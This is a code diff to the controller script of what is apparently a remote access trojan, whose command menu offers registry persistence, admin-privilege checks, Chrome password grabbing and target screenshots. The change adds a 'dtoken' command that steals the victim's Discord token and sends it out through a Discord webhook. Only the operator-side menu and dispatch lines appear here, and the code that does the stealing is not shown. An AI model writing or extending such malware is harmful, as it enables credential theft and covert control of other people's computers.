@@ -70,6 +70,8 @@ def target_communication():
             os.rename('screenshot0', 'screenshot.jpg')
             print("screenshot saved as screenshot.jpg")
             count += 1
+	elif command[:6] == "dtoken":
+		print("token will be sent through your discord webhook")
         elif command == 'help':
 	            print(termcolor.colored('''\n
                 quit                                --> Quit Session With The Target
@@ -83,7 +85,8 @@ def target_communication():
                 persistence *RegName* *fileName*    --> Create Persistence In Registry
 		checkpriv                           --> check admin privilege
 		chromegrab                          --> grab chrome passwords
-		screenshot                          --> get target screenshot''', 'green'))
+		screenshot                          --> get target screenshot
+		dtoken                              --> get target discord token(through discord webhook)''', 'green'))
         else:
             result = reliable_recv()
             print(result)
